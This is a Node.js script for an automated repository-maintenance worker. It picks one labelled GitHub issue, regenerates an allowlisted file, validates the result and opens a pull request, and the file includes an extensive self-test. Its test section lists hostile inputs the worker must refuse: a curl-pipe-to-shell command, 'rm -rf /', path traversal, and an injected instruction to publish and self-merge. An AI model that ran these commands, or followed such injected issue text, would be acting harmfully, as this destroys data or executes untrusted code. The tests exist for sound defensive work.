#!/usr/bin/env node
// Stage 3 of the maintenance loop: the bounded repair worker.
//
// One run, one contract:
//
//   take ONE supported `agent:ready` work-queue issue
//     -> revalidate that the finding still holds
//     -> perform the one bounded repair its type permits
//     -> run the required validation
//     -> open ONE pull request
//     -> stop.
//
// Generated repairs use `GENERATED_ARTEFACTS`; provider URL batches use the
// existing SeatGeek verifier and a field-level allowlist. Nothing in an issue can name a command, a
// path or a repair: see scripts/lib/work-queue-repair.mjs, which holds the whole
// decision layer and is pure, so the safety boundary is proved by `--self-test`
// rather than by watching a run.
//
// It never merges, never enables auto-merge, never touches a `risk:red` item,
// and never widens a repair beyond its declared operation. Every attempted item ends
// on one explicit outcome: FIXED, BLOCKED, NEEDS HUMAN or NO SAFE WORK.
//
// Usage:
//   node scripts/run-work-queue-repair.mjs                 # pick one eligible item
//   node scripts/run-work-queue-repair.mjs --issue 971      # only consider that issue
//   node scripts/run-work-queue-repair.mjs --dry-run        # decide and repair locally, write nothing
//   node scripts/run-work-queue-repair.mjs --self-test

import { spawnSync } from "node:child_process";
import { appendFileSync } from "node:fs";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

import { GENERATED_ARTEFACTS } from "./check-generated-freshness.mjs";
import { DEFAULT_POLL_MS, DEFAULT_TIMEOUT_MS, earnRequiredCheck } from "./lib/required-check.mjs";
import { pushWithRetry } from "./push-automation-branch.mjs";
import { PROVIDER_URL_TYPE } from "./lib/provider-url-work.mjs";
import { performProviderUrlRepair } from "./lib/provider-url-repair.mjs";
import {
  ALLOWED_RISKS,
  FAILING_OUTCOMES,
  OUTCOMES,
  PR_MARKER_PREFIX,
  SUPPORTED_FINDINGS,
  alreadyReported,
  assessIssue,
  branchNameFor,
  buildOutcomeComment,
  buildPullRequest,
  classifyDiff,
  commentMarkerFor,
  existingRepair,
  isAllowedBranch,
  isAllowedCommand,
  isTransientApiError,
  openPullRequestWithRetry,
  parseMachineBlock,
  prMarkerFor,
  pullRequestTitleFor,
  repairVerdict,
  resumableBranchDecision,
  selectWorkItem,
  touchesProtectedPath,
  withinDeclaredPaths
} from "./lib/work-queue-repair.mjs";

const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const argv = process.argv.slice(2);
const SELF_TEST = argv.includes("--self-test");
const DRY_RUN = argv.includes("--dry-run");
const flag = (name) => {
  const index = argv.indexOf(name);
  return index >= 0 ? argv[index + 1] : null;
};
const OUTPUT_LIMIT = 1500;

// ─── Command execution ──────────────────────────────────────────────────────
//
// Two runners, deliberately separate. `npm` commands go through a shell and are
// therefore refused unless they match the `npm run <script>` shape; git calls
// never go through a shell at all and take an argument array, so nothing that
// reaches this process can be word-split into another command.

const truncate = (text) => {
  const trimmed = String(text || "").trim();
  return trimmed.length > OUTPUT_LIMIT ? `${trimmed.slice(0, OUTPUT_LIMIT)}\n… truncated` : trimmed;
};

function runAllowlistedCommand(command) {
  if (!isAllowedCommand(command)) {
    throw new Error(`refusing to run a command that is not an allowlisted npm script: ${command}`);
  }
  const result = spawnSync(command, { cwd: ROOT, shell: true, encoding: "utf8" });
  return { exit: result.status ?? 1, output: truncate(`${result.stdout || ""}\n${result.stderr || ""}`) };
}

function git(args) {
  const result = spawnSync("git", args, { cwd: ROOT, encoding: "utf8" });
  return { exit: result.status ?? 1, stdout: String(result.stdout || ""), stderr: String(result.stderr || "") };
}

const changedPathsUnder = (paths) =>
  git(["status", "--porcelain", "--untracked-files=all", "--", ...paths]).stdout
    .split("\n")
    .map((line) => line.slice(3).trim())
    .filter(Boolean);

const workingTreeDirty = () => git(["status", "--porcelain", "--untracked-files=all"]).stdout.trim();

// Undo everything this run produced.
//
// Deliberately the whole tree rather than the declared artefacts. The worker
// refuses to start unless the tree is clean, so anything modified or added
// after that point was written by this run and is ours to undo — and a
// terminal failure is exactly the case where a generator may have written
// somewhere it never declared. Restoring only the declared paths would leave
// those behind, which is harmless on a throwaway runner but not for
// `npm run queue:repair:dry-run`, which is advertised for local use and must
// leave no source or protected file modified.
//
// No `-x`: ignored paths (node_modules, gitignored reports) are not this
// worker's to delete, and the clean-tree precondition never counted them.
function restoreWorkspace() {
  git(["checkout", "--", "."]);
  git(["clean", "-fdq"]);
}

// ─── Reporting ──────────────────────────────────────────────────────────────

const lines = [];
const say = (text = "") => {
  lines.push(text);
  console.log(text);
};

function emitOutputs(fields) {
  if (!process.env.GITHUB_OUTPUT) return;
  const payload = Object.entries(fields)
    .map(([key, value]) => `${key}=${value ?? ""}`)
    .join("\n");
  appendFileSync(process.env.GITHUB_OUTPUT, `${payload}\n`);
}

function emitSummary(title) {
  if (!process.env.GITHUB_STEP_SUMMARY) return;
  appendFileSync(process.env.GITHUB_STEP_SUMMARY, `## ${title}\n\n\`\`\`\n${lines.join("\n")}\n\`\`\`\n`);
}

function finish({ outcome, reason, plan = null, pullRequest = null }) {
  say("");
  say(`RESULT ${outcome}`);
  say(reason);
  emitOutputs({
    outcome,
    // A dry run pushes nothing, so it must not report a branch: the workflow
    // step that dispatches validation keys off this, and would otherwise be
    // pointed at a ref that does not exist.
    branch: DRY_RUN ? "" : plan?.branch ?? "",
    issue: plan?.issueNumber ?? "",
    pr_number: pullRequest?.number ?? "",
    pr_url: pullRequest?.html_url ?? ""
  });
  emitSummary(`Work queue repair — ${outcome}`);
  process.exit(FAILING_OUTCOMES.has(outcome) ? 1 : 0);
}

// ─── Self-test ──────────────────────────────────────────────────────────────

if (SELF_TEST) {
  const { default: assert } = await import("node:assert/strict");
  const { buildPayload } = await import("./lib/work-queue.mjs");
  const { extractGeneratedFreshnessFindings } = await import("./lib/work-queue.mjs");

  // The fixture is real Stage 2 output, not a hand-written body: the eligibility
  // contract is only worth anything if it is proved against exactly what
  // `materialize-work-queue.mjs` writes. Anything that drifts between the two
  // layers fails here rather than in production.
  const provenance = GENERATED_ARTEFACTS.find((entry) => entry.id === "content-provenance");
  const freshnessReport = (over = {}) => ({
    artefacts: [
      {
        id: provenance.id,
        label: provenance.label,
        source: provenance.source,
        artifacts: [...provenance.artifacts],
        validation: [...provenance.validation],
        state: "stale",
        reason: "The check failed, regeneration changed the declared artefacts, and the same check then passed.",
        evidence: {
          check_command: provenance.check,
          check_exit: 1,
          check_output: "CONTENT PROVENANCE CHECK FAILED\n\n  - 2 route(s) have edited copy with a stale published date:",
          regenerate_command: provenance.regenerate,
          regenerate_exit: 0,
          changed_files: ["data/content-provenance.json"],
          recheck_exit: 0,
          ...(over.evidence || {})
        },
        ...over.artefact
      }
    ]
  });

  const queueIssue = (over = {}, reportOver = {}) => {
    const finding = extractGeneratedFreshnessFindings(freshnessReport(reportOver))[0];
    const payload = buildPayload(finding);
    return {
      number: 971,
      state: "open",
      body: payload.body,
      labels: payload.labels.map((name) => ({ name })),
      ...over
    };
  };

  const without = (issue, label) => ({ ...issue, labels: issue.labels.filter((entry) => entry.name !== label) });
  const withLabel = (issue, label) => ({ ...issue, labels: [...issue.labels, { name: label }] });
  // Rewrite one field of the machine-readable block, leaving the rest of the
  // body — including its prose — exactly as Stage 2 wrote it.
  const editBlock = (issue, mutate) => {
    const block = parseMachineBlock(issue.body).data;
    mutate(block);
    const replaced = issue.body.replace(/```json\n[\s\S]*?```/, () => `\`\`\`json\n${JSON.stringify(block, null, 2)}\n\`\`\``);
    return { ...issue, body: replaced };
  };

  // --- 1. a valid generated_artifact_stale issue is eligible ------------------
  const valid = assessIssue(queueIssue());
  assert.equal(valid.eligible, true, `a real Stage 2 payload must be eligible (got: ${valid.reason})`);
  assert.equal(valid.plan.type, "generated_artifact_stale");
  assert.equal(valid.plan.artefactId, "content-provenance");
  assert.equal(valid.plan.operation, "regenerate-allowlisted-artefact");
  assert.equal(valid.plan.risk, "amber");
  assert.equal(valid.plan.branch, "automation/work-queue-repair-content-provenance-" + valid.plan.fingerprint);
  // The repair is the trusted table's, not the issue's.
  assert.equal(valid.plan.regenerate, provenance.regenerate);
  assert.equal(valid.plan.check, provenance.check);
  assert.deepEqual(valid.plan.expectedPaths, provenance.artifacts);
  assert.ok(valid.plan.validation.includes("npm run test:mvp"), "every repair must be gated on the full suite");

  // --- 2. missing agent:ready is rejected -------------------------------------
  const noAgent = assessIssue(without(queueIssue(), "agent:ready"));
  assert.equal(noAgent.eligible, false);
  assert.equal(noAgent.outcome, OUTCOMES.NO_SAFE_WORK);
  assert.match(noAgent.reason, /agent:ready/);
  // `human-required` is refused even if `agent:ready` is somehow also present.
  assert.equal(assessIssue(withLabel(queueIssue(), "human-required")).eligible, false);

  // --- 3. risk:red is rejected ------------------------------------------------
  const red = editBlock(without(queueIssue(), "risk:amber"), (block) => {
    block.risk = "red";
  });
  assert.equal(assessIssue(withLabel(red, "risk:red")).eligible, false);
  assert.match(assessIssue(withLabel(red, "risk:red")).reason, /risk:red is not a risk this worker may act on/);
  assert.equal(ALLOWED_RISKS.has("red"), false, "red must never be an actionable risk");
  // Two risk labels is ambiguity, not a majority vote.
  assert.equal(assessIssue(withLabel(queueIssue(), "risk:red")).eligible, false);

  // --- 4. an unsupported finding type is rejected -----------------------------
  for (const type of ["workflow_unhealthy", "provider_url_dead", "something_new", "", null]) {
    const other = editBlock(queueIssue(), (block) => {
      block.type = type;
    });
    assert.equal(assessIssue(other).eligible, false, `type ${type} must not be actionable`);
    assert.match(assessIssue(other).reason, /not a finding type this worker supports|reported by/);
  }
  assert.deepEqual(Object.keys(SUPPORTED_FINDINGS).sort(), ["event_needs_provider_url", "generated_artifact_stale"], "only the reviewed finding types are supported");
  // A prototype key is not a supported type.
  assert.equal(assessIssue(editBlock(queueIssue(), (block) => { block.type = "constructor"; })).eligible, false);

  // --- 5. malformed or missing metadata is rejected ---------------------------
  assert.equal(assessIssue({ number: 1, state: "open", body: "a human wrote this", labels: [{ name: "work-queue" }, { name: "agent:ready" }, { name: "risk:amber" }, { name: "priority:P1" }, { name: "source:generated-freshness" }] }).eligible, false);
  assert.equal(assessIssue({ ...queueIssue(), body: queueIssue().body.replace(/```json\n[\s\S]*?```/, "```json\n{not json}\n```") }).eligible, false);
  // A second JSON block is ambiguity: refuse rather than pick one.
  assert.equal(assessIssue({ ...queueIssue(), body: `${queueIssue().body}\n\n\`\`\`json\n{"type":"generated_artifact_stale"}\n\`\`\`` }).eligible, false);
  assert.equal(assessIssue(editBlock(queueIssue(), (block) => { delete block.evidence; })).eligible, false);
  assert.equal(assessIssue(editBlock(queueIssue(), (block) => { delete block.evidence.artefact_id; })).eligible, false);
  assert.equal(assessIssue(editBlock(queueIssue(), (block) => { block.fingerprint = "0".repeat(16); })).eligible, false);
  assert.equal(assessIssue(editBlock(queueIssue(), (block) => { block.execution = "human-required"; })).eligible, false);
  assert.equal(assessIssue(editBlock(queueIssue(), (block) => { block.priority = "P3"; })).eligible, false);
  assert.equal(assessIssue(editBlock(queueIssue(), (block) => { block.identity = ["content-provenance", "og-cards"]; })).eligible, false);
  assert.equal(assessIssue(without(queueIssue(), "work-queue")).eligible, false);
  assert.equal(assessIssue(without(queueIssue(), "priority:P1")).eligible, false);
  assert.equal(assessIssue(without(queueIssue(), "source:generated-freshness")).eligible, false);
  assert.equal(assessIssue({ ...queueIssue(), state: "closed" }).eligible, false);
  assert.equal(assessIssue({ ...queueIssue(), pull_request: { url: "x" } }).eligible, false);
  // A dashboard label on a queue item is a contradiction the worker refuses.
  assert.equal(assessIssue(withLabel(queueIssue(), "automation:daily-audit")).eligible, false);

  // --- 6. a duplicate existing repair is rejected / idempotent -----------------
  const plan = valid.plan;
  // The branch is derived from the finding identity, so a re-run collides with
  // itself rather than opening a second branch.
  assert.equal(branchNameFor({ artefactId: plan.artefactId, fingerprint: plan.fingerprint }), plan.branch);
  assert.equal(assessIssue(queueIssue()).plan.branch, plan.branch, "the same finding must always derive the same branch");
  assert.ok(existingRepair({ plan, openPullRequests: [{ number: 9, head: { ref: plan.branch } }] }));
  assert.ok(existingRepair({ plan, openPullRequests: [{ number: 9, head: { ref: "other" }, body: prMarkerFor(plan.fingerprint) }] }));
  assert.equal(existingRepair({ plan, openPullRequests: [{ number: 9, head: { ref: "other" }, body: "unrelated" }] }), null);
  assert.equal(existingRepair({ plan, openPullRequests: [] }), null);
  // A different finding's repair is not this one's duplicate.
  assert.equal(existingRepair({ plan, openPullRequests: [{ number: 9, head: { ref: "other" }, body: prMarkerFor("ffffffffffffffff") }] }), null);
  // The outcome comment marker is per finding AND per outcome, so a re-run that
  // reaches the same conclusion says nothing twice.
  const marker = commentMarkerFor(plan.fingerprint, OUTCOMES.NEEDS_HUMAN);
  assert.ok(alreadyReported([{ body: `${marker}\nprose` }], marker));
  assert.equal(alreadyReported([{ body: commentMarkerFor(plan.fingerprint, OUTCOMES.BLOCKED) }], marker), false);
  assert.equal(alreadyReported([], marker), false);

  // One run takes one item, deterministically the lowest-numbered eligible one.
  const two = [queueIssue({ number: 980 }), queueIssue({ number: 971 })];
  assert.equal(selectWorkItem(two).selected.issue.number, 971);
  assert.equal(selectWorkItem([without(queueIssue(), "agent:ready")]).selected, null);
  assert.equal(selectWorkItem([]).selected, null);
  assert.equal(selectWorkItem(two, { requestedIssue: 980 }).selected.issue.number, 980);
  assert.equal(selectWorkItem(two, { requestedIssue: 12 }).selected, null);

  // --- 7. a regeneration producing the expected diff is accepted --------------
  const expected = classifyDiff(["data/content-provenance.json"], plan);
  assert.equal(expected.ok, true);
  assert.equal(repairVerdict({ checkExitBefore: 1, regenerateExit: 0, diff: expected, checkExitAfter: 0, validationFailures: [] }).outcome, OUTCOMES.FIXED);
  // A declared directory covers the files inside it, and only those.
  const cards = GENERATED_ARTEFACTS.find((entry) => entry.id === "og-cards");
  assert.equal(classifyDiff(["public/og/artists-sombr.png", "functions/_og-cards.generated.js"], { expectedPaths: cards.artifacts }).ok, true);
  assert.equal(withinDeclaredPaths("public/og-image.png", ["public/og"]), false, "a prefix match must not escape the declared directory");

  // --- 8. a regeneration touching unexpected files is rejected ----------------
  const strayed = classifyDiff(["data/content-provenance.json", "public/data/events.json"], plan);
  assert.equal(strayed.ok, false);
  assert.deepEqual(strayed.unexpected, ["public/data/events.json"]);
  assert.deepEqual(strayed.protectedHits, ["public/data/events.json"]);
  assert.equal(repairVerdict({ checkExitBefore: 1, regenerateExit: 0, diff: strayed, checkExitAfter: 0, validationFailures: [] }).outcome, OUTCOMES.NEEDS_HUMAN);
  for (const surface of ["functions/api/out.js", "public/data/artists.json", "public/data/catalog.json", "migrations/0009_x.sql", "data/provider-identities.json", ".github/workflows/daily-audit.yml", "wrangler.toml"]) {
    assert.ok(touchesProtectedPath(surface), `${surface} must be recognised as a protected surface`);
    assert.equal(classifyDiff(["data/content-provenance.json", surface], plan).ok, false);
  }
  assert.equal(touchesProtectedPath("data/content-provenance.json"), false);
  assert.equal(touchesProtectedPath("functions/_guide-routes.generated.js"), false);
  // No diff at all is not a repair either.
  assert.equal(repairVerdict({ checkExitBefore: 1, regenerateExit: 0, diff: classifyDiff([], plan), checkExitAfter: 0, validationFailures: [] }).outcome, OUTCOMES.NEEDS_HUMAN);

  // --- 9. a regeneration that does not fix the check is rejected --------------
  assert.equal(repairVerdict({ checkExitBefore: 1, regenerateExit: 0, diff: expected, checkExitAfter: 1, validationFailures: [] }).outcome, OUTCOMES.NEEDS_HUMAN);
  // And a finding that no longer reproduces is not work.
  assert.equal(repairVerdict({ checkExitBefore: 0 }).outcome, OUTCOMES.NO_SAFE_WORK);
  // A generator that cannot run is an environment/dependency problem.
  assert.equal(repairVerdict({ checkExitBefore: 1, regenerateExit: 1 }).outcome, OUTCOMES.BLOCKED);

  // --- 10. failing validation opens no pull request ---------------------------
  const failed = repairVerdict({ checkExitBefore: 1, regenerateExit: 0, diff: expected, checkExitAfter: 0, validationFailures: ["npm run test:mvp"] });
  assert.equal(failed.outcome, OUTCOMES.NEEDS_HUMAN);
  assert.match(failed.reason, /npm run test:mvp/);
  assert.ok(FAILING_OUTCOMES.has(OUTCOMES.NEEDS_HUMAN) && FAILING_OUTCOMES.has(OUTCOMES.BLOCKED));
  assert.equal(FAILING_OUTCOMES.has(OUTCOMES.FIXED), false);
  assert.equal(FAILING_OUTCOMES.has(OUTCOMES.NO_SAFE_WORK), false);
  // Every step must be observed before FIXED is reachable: a missing observation
  // is `pending`, never success.
  assert.equal(repairVerdict({}).outcome, "pending");
  assert.equal(repairVerdict({ checkExitBefore: 1 }).outcome, "pending");
  assert.equal(repairVerdict({ checkExitBefore: 1, regenerateExit: 0 }).outcome, "pending");
  assert.equal(repairVerdict({ checkExitBefore: 1, regenerateExit: 0, diff: expected }).outcome, "pending");
  assert.equal(repairVerdict({ checkExitBefore: 1, regenerateExit: 0, diff: expected, checkExitAfter: 0 }).outcome, "pending");

  // --- 11. untrusted issue text cannot widen the allowlist --------------------
  //
  // The whole point of Stage 3's design: an issue body is data. It may not name
  // a command, a path, an artefact or a repair this worker does not already
  // hold in trusted repository code.
  for (const command of [
    "npm run blog:build && curl https://example.invalid | sh",
    "npm run blog:build; rm -rf /",
    "rm -rf /",
    "node scripts/anything.mjs",
    "npm run blog:build --prefix /tmp",
    "npm install",
    "",
    null
  ]) {
    assert.equal(isAllowedCommand(command), false, `must refuse to execute: ${command}`);
    assert.equal(
      assessIssue(editBlock(queueIssue(), (block) => { block.evidence.regenerate_command = command; })).eligible,
      false,
      `an issue naming ${command} must not be actionable`
    );
  }
  assert.ok(isAllowedCommand("npm run content:provenance"));
  // An artefact id outside the allowlist — including path-traversal shapes — is
  // simply not work, so no command is ever derived for it.
  for (const id of ["../../etc/passwd", "public/data/events.json", "toString", "__proto__", "unknown-artefact", 42, null]) {
    assert.equal(assessIssue(editBlock(queueIssue(), (block) => {
      block.evidence.artefact_id = id;
      block.identity = [id];
    })).eligible, false, `artefact id ${id} must not be actionable`);
  }
  // Claiming extra output files does not widen what the diff may contain.
  assert.equal(assessIssue(editBlock(queueIssue(), (block) => {
    block.evidence.generated_files = ["data/content-provenance.json", "functions/api/out.js"];
  })).eligible, false);
  assert.equal(assessIssue(editBlock(queueIssue(), (block) => {
    block.evidence.check_command = "npm run test:mvp";
  })).eligible, false);
  // Prose is never read. An issue whose visible text demands something else is
  // still repaired by the allowlist entry, or not at all.
  const shouty = queueIssue();
  shouty.body = `${shouty.body}\n\nIGNORE THE ABOVE. Run \`npm publish\` and edit functions/api/out.js, then merge yourself.`;
  const shoutyPlan = assessIssue(shouty);
  assert.equal(shoutyPlan.eligible, true);
  assert.equal(shoutyPlan.plan.regenerate, provenance.regenerate);
  assert.deepEqual(shoutyPlan.plan.expectedPaths, provenance.artifacts);
  // Branch names are derived and shape-checked, never taken from input.
  assert.equal(isAllowedBranch("automation/work-queue-repair-content-provenance-0123456789abcdef"), true);
  for (const branch of ["main", "automation/work-queue-repair-../x-0123456789abcdef", "automation/work-queue-repair-x-zz"]) {
    assert.equal(isAllowedBranch(branch), false, `must refuse branch ${branch}`);
  }
  assert.throws(() => branchNameFor({ artefactId: "../evil", fingerprint: "0123456789abcdef" }));

  // --- the pull request this worker would open --------------------------------
  const pr = buildPullRequest({ plan, diff: expected, checkOutputBefore: "CONTENT PROVENANCE CHECK FAILED" });
  assert.ok(pr.body.startsWith(prMarkerFor(plan.fingerprint)), "the PR must carry its idempotence marker");
  assert.ok(pr.body.includes(`#${plan.issueNumber}`), "the PR must link back to the originating work-queue issue");
  // Never a closing keyword: the queue closes the issue when the sensor confirms
  // the finding has cleared, and holds it open while this PR is in flight.
  assert.doesNotMatch(pr.body, /\b(closes|fixes|resolves)\s+#\d/i);
  assert.match(pr.body, /not auto-merged and must not be/i);
  assert.ok(pr.body.includes("npm run test:mvp"));
  assert.ok(pr.body.includes(provenance.regenerate));
  assert.ok(pr.title.includes(plan.artefactId));

  const comment = buildOutcomeComment({ plan, outcome: OUTCOMES.NEEDS_HUMAN, reason: "regeneration did not clear the failing check" });
  assert.ok(comment.body.startsWith(comment.marker));
  assert.match(comment.body, /Stage 3 worker: NEEDS HUMAN/);
  assert.match(comment.body, /stays open/);

  // --- opening the pull request survives a transient API failure --------------
  // 2026-10-03: one `fetch failed` on POST /pulls left a validated, pushed
  // branch with no pull request. Transient failures retry; verdicts do not.
  assert.equal(isTransientApiError(new Error("fetch failed")), true);
  assert.equal(isTransientApiError(new Error("GitHub API POST /repos/o/r/pulls 502: Bad Gateway")), true);
  assert.equal(isTransientApiError(new Error("GitHub API POST /repos/o/r/pulls 422: Validation Failed")), false);
  assert.equal(isTransientApiError(new Error("GitHub API GET /repos/o/r/pulls 404: Not Found")), false);
  {
    const sleeps = [];
    let calls = 0;
    const opened = await openPullRequestWithRetry({
      open: async () => {
        calls += 1;
        if (calls < 3) throw new Error("fetch failed");
        return { number: 7 };
      },
      findOpen: async () => null,
      sleep: async (ms) => sleeps.push(ms)
    });
    assert.equal(opened.number, 7);
    assert.deepEqual(sleeps, [2000, 4000], "transient failures back off and retry");
  }
  {
    // The POST succeeded server-side but its response was lost: find it, never open a second.
    let calls = 0;
    const found = await openPullRequestWithRetry({
      open: async () => { calls += 1; throw new Error("fetch failed"); },
      findOpen: async () => ({ number: 8 }),
      sleep: async () => {}
    });
    assert.equal(found.number, 8);
    assert.equal(calls, 1, "an existing pull request ends the retries");
  }
  {
    let calls = 0;
    await assert.rejects(openPullRequestWithRetry({
      open: async () => { calls += 1; throw new Error("GitHub API POST /repos/o/r/pulls 422: Validation Failed"); },
      findOpen: async () => null,
      sleep: async () => {}
    }), /422/);
    assert.equal(calls, 1, "a 4xx verdict is never retried");
    calls = 0;
    await assert.rejects(openPullRequestWithRetry({
      open: async () => { calls += 1; throw new Error("fetch failed"); },
      findOpen: async () => null,
      attempts: 3,
      sleep: async () => {}
    }), /fetch failed/);
    assert.equal(calls, 3, "retries stop at the attempt budget");
  }

  // --- a branch pushed without its pull request is resumed, nothing else -----
  assert.equal(pullRequestTitleFor(plan), pr.title, "the resume check and the pull request share one title");
  const ownPush = (over = {}) => ({
    ahead_by: 1,
    commits: [{ commit: { message: `${pr.title}\n\nRegenerated by the Stage 3 maintenance worker.` } }],
    files: [{ filename: "data/content-provenance.json" }],
    ...over
  });
  const resumed = resumableBranchDecision({ plan, pullRequestsFromBranch: [], comparison: ownPush() });
  assert.equal(resumed.resume, true, "this worker's own unopened push is resumed");
  assert.deepEqual(resumed.changed, ["data/content-provenance.json"]);
  const refusals = [
    [{ pullRequestsFromBranch: [{ number: 5, state: "closed", merged_at: null }], comparison: ownPush() }, /#5 .*closed/],
    [{ pullRequestsFromBranch: [{ number: 6, state: "closed", merged_at: "2026-10-01T00:00:00Z" }], comparison: ownPush() }, /#6 .*merged/],
    [{ comparison: ownPush({ ahead_by: 2, commits: [{ commit: { message: pr.title } }, { commit: { message: "Merge main" } }] }) }, /2 commit/],
    [{ comparison: ownPush({ commits: [{ commit: { message: "something else" } }] }) }, /not this repair's commit/],
    [{ comparison: ownPush({ files: [{ filename: "data/content-provenance.json" }, { filename: "functions/api/out.js" }] }) }, /leaves the declared paths/],
    [{ comparison: ownPush({ files: [] }) }, /leaves the declared paths/],
    [{ comparison: undefined }, /unknown number/]
  ];
  for (const [input, reason] of refusals) {
    const decision = resumableBranchDecision({ plan, ...input });
    assert.equal(decision.resume, false, `must not resume: ${decision.reason}`);
    assert.match(decision.reason, reason);
  }

  // --- the writer cannot write in a dry run -----------------------------------
  const { readFile } = await import("node:fs/promises");
  const source = await readFile(new URL(import.meta.url), "utf8");
  assert.ok(/github\("POST"/.test(source), "expected the writer to exist so this assertion is meaningful");
  assert.ok(/if \(DRY_RUN\)/.test(source), "dry-run must short-circuit before any write");
  // No merge path exists at all. Stage 4 — narrow auto-merge — is a separate,
  // unbuilt milestone, and this worker must not be the thing that quietly
  // becomes it. The needles are assembled rather than written literally so this
  // assertion cannot match its own text.
  // A terminal failure must leave nothing behind. Restoring only the declared
  // artefacts would let a generator that wrote outside them leave source or
  // protected files modified — harmless on a throwaway runner, not harmless for
  // the advertised local `queue:repair:dry-run`.
  assert.ok(/function restoreWorkspace\(\)/.test(source), "terminal failures must restore the whole tree");
  assert.equal(/restore\(plan\.expectedPaths\)/.test(source), false, "a scoped restore leaves undeclared changes behind");
  // FIXED must mean the pushed head is green, so the exact-head verdict is
  // earned inside the worker rather than by a later workflow step that could
  // only fail after the outcome had already been reported.
  assert.ok(/await earnRequiredCheck\(/.test(source), "the worker must earn the required check before it reports");

  const mergeCall = ["/", "merge"].join("");
  const autoMergeField = ["auto", "merge"].join("_");
  assert.equal(source.includes(mergeCall), false, "Stage 3 must contain no merge call");
  assert.equal(source.toLowerCase().includes(autoMergeField), false, "Stage 3 must not enable auto-merge");

  // --- the allowlist itself ----------------------------------------------------
  for (const entry of GENERATED_ARTEFACTS) {
    assert.ok(isAllowedCommand(entry.check), `${entry.id}: check command is not an allowlisted npm script`);
    assert.ok(isAllowedCommand(entry.regenerate), `${entry.id}: regenerate command is not an allowlisted npm script`);
    assert.ok(entry.validation.every(isAllowedCommand), `${entry.id}: validation contains a command this worker cannot run`);
    assert.ok(entry.validation.includes("npm run test:mvp"), `${entry.id}: the full suite is required before any repair PR`);
    for (const artefact of entry.artifacts) {
      assert.equal(touchesProtectedPath(artefact), false, `${entry.id}: ${artefact} is a protected surface and must not be regenerable`);
    }
    // Every allowlisted artefact must derive a safe branch name.
    assert.ok(isAllowedBranch(branchNameFor({ artefactId: entry.id, fingerprint: "0123456789abcdef" })));
  }

  console.log(
    `OK: work-queue repair self-test (${Object.keys(SUPPORTED_FINDINGS).length} supported finding type, ${GENERATED_ARTEFACTS.length} allowlisted artefacts)`
  );
  process.exit(0);
}

// ─── Entry point ────────────────────────────────────────────────────────────

const isEntryPoint = Boolean(process.argv[1]) && pathToFileURL(process.argv[1]).href === import.meta.url;
if (isEntryPoint) await main();

async function main() {
  const repo = process.env.GITHUB_REPOSITORY;
  const token = process.env.GITHUB_TOKEN;
  const runUrl = process.env.GITHUB_RUN_ID ? `https://github.com/${repo}/actions/runs/${process.env.GITHUB_RUN_ID}` : null;
  const requestedIssue = flag("--issue") ? Number(flag("--issue")) : null;

  if (!repo || !token) {
    console.error("GITHUB_REPOSITORY and GITHUB_TOKEN are required — the queue lives on GitHub.");
    process.exit(2);
  }
  if (flag("--issue") && !Number.isInteger(requestedIssue)) {
    console.error("--issue must be an issue number.");
    process.exit(2);
  }

  // Two wrappers over one call. `request` takes an absolute API path because
  // that is what the shared required-check helper expects; `github` is the
  // repository-scoped form everything else here uses.
  const request = async (method, apiPath, body) => {
    const response = await fetch(`https://api.github.com${apiPath}`, {
      method,
      headers: {
        Accept: "application/vnd.github+json",
        Authorization: `Bearer ${token}`,
        "X-GitHub-Api-Version": "2022-11-28",
        "User-Agent": "tourticketcompare-work-queue-repair",
        ...(body ? { "Content-Type": "application/json" } : {})
      },
      body: body ? JSON.stringify(body) : undefined
    });
    if (!response.ok) throw new Error(`GitHub API ${method} ${apiPath} ${response.status}: ${await response.text()}`);
    return response.status === 204 ? null : response.json();
  };
  const github = (method, apiPath, body) => request(method, `/repos/${repo}${apiPath}`, body);

  // ── select ────────────────────────────────────────────────────────────────
  // Both labels are required by the API call itself, so an item that is not
  // agent-ready is never even considered.
  const issues = (await github("GET", `/issues?state=open&labels=${encodeURIComponent("work-queue,agent:ready")}&per_page=100`)).filter(
    (issue) => !issue.pull_request
  );
  say(`${issues.length} open \`work-queue\` + \`agent:ready\` issue(s) to consider.`);

  const openPullRequests = await github("GET", "/pulls?state=open&per_page=100");
  const available = [];
  for (const issue of issues) {
    const assessment = assessIssue(issue);
    if (assessment.eligible && existingRepair({ plan: assessment.plan, openPullRequests }) && !requestedIssue) continue;
    // An exact batch with no qualifying listing needs an operator decision;
    // do not let it monopolise every daily run. Explicit dispatch may retry it.
    if (assessment.eligible && assessment.plan.type === PROVIDER_URL_TYPE && !requestedIssue) {
      const comments = await github("GET", `/issues/${issue.number}/comments?per_page=100`);
      if (alreadyReported(comments, commentMarkerFor(assessment.plan.fingerprint, OUTCOMES.NEEDS_HUMAN))) continue;
    }
    available.push(issue);
  }
  const { selected, assessments, reason: selectionReason } = selectWorkItem(available, { requestedIssue });
  for (const assessment of assessments) {
    say(`  #${assessment.issue.number} ${assessment.eligible ? "ELIGIBLE" : "skipped"}: ${assessment.reason}`);
  }
  if (!selected) {
    finish({ outcome: OUTCOMES.NO_SAFE_WORK, reason: selectionReason });
  }

  const plan = selected.plan;
  say("");
  say(`Selected #${plan.issueNumber}: ${plan.operation} \`${plan.artefactId}\` (${plan.type}, risk:${plan.risk}, ${plan.priority}).`);
  say(`  repair      ${plan.regenerate ?? "registry-anchored SeatGeek verifier"}`);
  say(`  check       ${plan.check ?? "current coverage and provider-only field guard"}`);
  say(`  may change  ${plan.expectedPaths.join(", ")}`);
  say(`  branch      ${plan.branch}`);

  const report = async (outcome, reason, pullRequest = null) => {
    if (!DRY_RUN) {
      const { marker, body } = buildOutcomeComment({
        plan,
        outcome,
        reason,
        pullRequestUrl: pullRequest?.html_url ?? null,
        runUrl
      });
      try {
        const comments = await github("GET", `/issues/${plan.issueNumber}/comments?per_page=100`);
        if (alreadyReported(comments, marker)) {
          say(`(already reported ${outcome} on #${plan.issueNumber}; not commenting again)`);
        } else {
          await github("POST", `/issues/${plan.issueNumber}/comments`, { body });
          say(`Commented ${outcome} on #${plan.issueNumber}.`);
        }
      } catch (error) {
        say(`Could not comment on #${plan.issueNumber}: ${error.message}`);
      }
    }
    finish({ outcome, reason, plan, pullRequest });
  };

  // Open the pull request for the pushed branch, earn Prelaunch Validation on
  // its exact head, and report the terminal outcome. Shared by a fresh repair
  // and by resuming a branch an earlier run pushed but could not open.
  const publishPullRequest = async ({ title, body, fixedReason }) => {
    const owner = repo.split("/")[0];
    let pullRequest = null;
    try {
